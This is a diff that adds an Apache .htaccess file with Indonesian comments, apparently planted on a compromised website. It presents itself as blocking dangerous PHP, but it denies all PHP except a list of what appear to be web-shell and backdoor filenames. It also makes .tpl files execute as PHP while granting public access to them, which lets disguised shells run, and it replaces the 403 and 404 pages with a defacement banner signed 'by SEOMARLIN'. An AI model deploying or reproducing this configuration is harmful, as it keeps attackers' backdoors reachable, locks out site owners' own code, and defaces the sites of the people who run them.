@@ -1,0 +1,37 @@
+Options -Indexes
+# Blokir file PHP dan script berbahaya
+<FilesMatch "(?i)\.(phtml|php|phar|php82|pgif|pht|phtm|shtml|inc|php[0-9]?|aspx?)$">
+Require all denied
+</FilesMatch>
+
+# IZINKAN gambar dan file publik
+<FilesMatch "\.(jpg|jpeg|png|gif|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
+Require all granted
+</FilesMatch>
+
+# Izinkan file tertentu
+<FilesMatch '^(body.php|Wns.php|Tesk.php|Wns.php|stat.php|copymarketing.php|file.php|telegram.php|body.php|Sear.php|body.php|stone_hinges.php|erode-light-demo.php|generator_config_file.php|loggofile.php|WSC.php|tyeword.php|unitpss.php|body.php|folder.php|resin-apln-5.php|bopp-apln-7.php|W.cut.php|1_3.php|class-memlbe.php|rss-facker.php|Sans_folder.php|Sans_sms.php|zh.kj.php|ancur.php|Prias.php|info.php|Full_bes.php|File.php|axme_chepanel.php|acme_chane.php|sportime.php|index.php|select5.php|Exiper.php|class-wp-GSS.php|code.php|false.php|dila.php|google.php|info.php|index1.php|info.php)$'>
+Require all granted
+</FilesMatch>
+
+# Blokir file tersembunyi
+<FilesMatch "^\.">
+Require all denied
+</FilesMatch>
+
+# Rewrite untuk aplikasi
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+# Error page
+ErrorDocument 403 '<center><img src="https://media1.tenor.com/m/-X0l3bF-IuEAAAAC/killer-bee-naruto.gif"><h3>DASAR PAYAH-DASAR LEMAH!! KURATAKAN BO KAU VATHAN</font><br><h2>by SEOMARLIN</h2>'
+ErrorDocument 404 '<center><img src="https://media1.tenor.com/m/-X0l3bF-IuEAAAAC/killer-bee-naruto.gif"><h3>DASAR PAYAH-DASAR LEMAH!! KURATAKAN BO KAU VATHAN</font><br><h2>by SEOMARLIN</h2>'
+
+# Tambahkan tipe PHP untuk .tpl
+AddType application/x-httpd-php .tpl
